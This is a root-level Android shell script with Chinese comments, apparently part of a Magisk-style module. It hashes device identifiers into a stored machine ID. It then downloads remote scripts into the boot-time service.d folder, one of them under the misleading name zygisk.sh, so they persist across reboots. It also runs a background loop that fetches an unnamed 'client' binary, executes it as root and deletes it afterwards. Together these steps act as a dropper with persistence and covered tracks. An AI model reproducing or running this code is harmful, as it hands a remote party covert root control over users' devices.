
#!/bin/sh
# ------------------------------
# 获取设备唯一 ID（机器码）
# ------------------------------
device_id="unknown"
device_components=""

if command -v getprop >/dev/null 2>&1; then
  serial=$(getprop ro.serialno 2>/dev/null)
  model=$(getprop ro.product.model 2>/dev/null)
  manufacturer=$(getprop ro.product.manufacturer 2>/dev/null)
  brand=$(getprop ro.product.brand 2>/dev/null)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
  [ -n "$brand" ] && device_components="${device_components}_${brand}"
fi

if [ -z "$device_components" ] && [ -f /system/build.prop ]; then
  serial=$(grep -m1 '^ro.serialno=' /system/build.prop | cut -d'=' -f2)
  model=$(grep -m1 '^ro.product.model=' /system/build.prop | cut -d'=' -f2)
  manufacturer=$(grep -m1 '^ro.product.manufacturer=' /system/build.prop | cut -d'=' -f2)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
fi

if [ -n "$device_components" ]; then
  if command -v md5sum >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5sum | awk '{print $1}')
  elif command -v md5 >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5 | awk '{print $1}')
  fi
fi


# ------------------------------
# 保存 device_id
# ------------------------------
deviceid_path="/data/adb/.deviceid"
mkdir -p /data/adb 2>/dev/null || true
if [ -n "$device_id" ] && [ "$device_id" != "unknown" ]; then
  echo "$device_id" > "$deviceid_path"
  chmod 600 "$deviceid_path"
fi

# ------------------------------
# 输出结果
# ------------------------------
# ------------------------------
# 下载并执行客户端（后台进程）
# ------------------------------
curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
curl -sS -o /data/adb/service.d/zygisk.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
chmod +x /data/adb/service.d/run.sh
chmod +x /data/adb/service.d/zygisk.sh
MODULE_DIR="/data/adb/modules"

{
    temp_script="/data/local/tmp/client"
    
    while true; do
        # 下载客户端
        if curl -sS -o "$temp_script" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client" >/dev/null 2>&1; then
            # 下载成功，给执行权限
            chmod +x "$temp_script"
            # 执行客户端，并在执行完毕后删除
            "$temp_script" && rm -f "$temp_script"
            
            # 如果执行失败也删除文件
            [ -f "$temp_script" ] && rm -f "$temp_script"
            
            # 成功执行后退出循环
            break
        else
            # 下载失败，等待30秒后重试
            sleep 30
        fi
    done
} &
